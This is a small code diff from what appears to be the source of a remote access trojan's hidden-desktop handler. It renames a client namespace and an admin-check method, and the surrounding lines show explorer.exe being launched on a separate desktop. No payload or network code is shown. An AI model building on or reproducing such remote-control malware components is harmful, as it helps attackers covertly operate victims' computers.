@@ -8,7 +8,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using xeno_rat_client;
+using test_rat_client;
 
 namespace Hidden_handler
 {
@@ -80,7 +80,7 @@ namespace Hidden_handler
                     }
                 }
             }
-            if (Utils.IsAdmin())
+            if (Utils.IsElevated())
             {
                 if (_ProcessHelper.RunAsRestrictedUser(@"C:\Windows\explorer.exe", DesktopName)) 
                 {
